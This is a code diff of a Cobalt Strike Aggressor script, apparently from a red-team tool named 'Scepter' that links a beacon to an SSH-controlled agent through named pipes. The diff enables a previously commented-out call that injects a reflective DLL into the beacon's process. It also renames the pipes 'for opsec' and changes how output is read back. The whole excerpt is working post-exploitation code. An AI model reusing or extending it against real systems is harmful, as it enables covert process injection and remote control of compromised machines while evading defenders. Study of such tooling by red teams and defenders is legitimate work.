@@ -1,7 +1,8 @@
 import beacon.CommandBuilder;
 
-global('$ssh_inited $server_dll_name $pipe_wait $arch_list $file_ext $pipe_output_name_final $agent_base_name $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_ip_connect_stomp_me $ssh_port_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
+global('$ssh_inited $server_dll_name $reading_inited $pipe_wait $arch_list $file_ext $pipe_output_name_final $agent_base_name $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_ip_connect_stomp_me $ssh_port_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
 $ssh_inited = -1;
+$reading_inited = -1;
 
 println("[SCEPTER] You are now holding the Scepter.")
 
@@ -9,8 +10,8 @@ println("[SCEPTER] You are now holding the Scepter.")
 # _final are the names that are being stomped into the artifacts
 # _stomp_me_name are the original names in the artifacts that are going to be stomped in either by the globals or by user specified parameters.
 
-$pipe_output_name_final = "BigGasPipe_updater_0"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
-$pipe_input_name_final = "BigGasPipe_updater_1"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_output_name_final = "BigGasPipe_updater_00"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_input_name_final = "BigGasPipe_updater_01"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
 $interface_ip_final = "0.0.0.0"; # the server can be tightened down to a specific interface by changing this
 
 # Target strings that are stomped
@@ -236,7 +237,7 @@ alias scepter-init {
     closef($handle);
 
     # self-inject the dll
-    # bshinject($beacon_id, $pid, $barch, $rdll_path_out);
+    bshinject($beacon_id, $pid, $barch, $rdll_path_out);
 
     $ssh_inited = 1;
     
@@ -308,11 +309,17 @@ alias scepter-exec {
     # execute it.
     beacon_inline_execute($bid, $bof_data, "go", $args);
 
-    # give the bof a couple of seconds to write the data to the pipe
-    sleep(2 * 1000);
 
-    # read from the output pipe
-    scepter-read($bid, $null);
+    if($reading_inited < 0){
+        # give the bof a couple of seconds to write the data to the pipe
+        sleep(2 * 1000);
+
+        # read from the output pipe
+        scepter-read($bid, $null);
+
+        $reading_inited = 1;
+
+    }
 }
 
 # $1 - beacon id
